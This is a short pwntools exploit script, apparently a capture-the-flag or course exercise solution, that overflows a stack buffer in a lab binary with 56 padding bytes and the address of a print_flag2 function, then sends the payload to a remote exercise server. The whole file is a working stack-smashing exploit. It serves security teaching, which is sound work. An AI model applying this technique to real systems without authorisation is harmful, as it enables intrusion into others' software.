from pwn import *

elf = ELF("./36-5-4-vuln")
fun = p64(elf.symbols.print_flag2)
payload = b"A"*56 + fun # RSP offset + print_flag2() pointer

def main():
    p = remote("vm.kam.mff.cuni.cz", 13337)
    p.recvuntil("Zadejte heslo:")
    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    main()
